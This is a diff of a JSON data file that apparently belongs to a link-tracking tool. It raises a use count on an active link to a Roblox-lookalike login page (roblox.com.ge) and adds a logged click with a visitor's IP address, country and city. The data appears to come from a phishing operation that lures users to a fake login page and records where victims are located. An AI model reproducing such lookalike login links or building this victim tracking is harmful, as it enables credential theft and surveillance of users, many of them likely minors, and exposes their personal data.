@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1089,
+    "useCount": 1090,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8851,6 +8851,14 @@
       },
       {
         "timestamp": 1777258946175,
+        "ip": "191.97.99.216",
+        "country": "Argentina",
+        "city": "General Roca",
+        "flag": "🇦🇷",
+        "countryCode": "AR"
+      },
+      {
+        "timestamp": 1777258987510,
         "ip": "191.97.99.216",
         "country": "Argentina",
         "city": "General Roca",
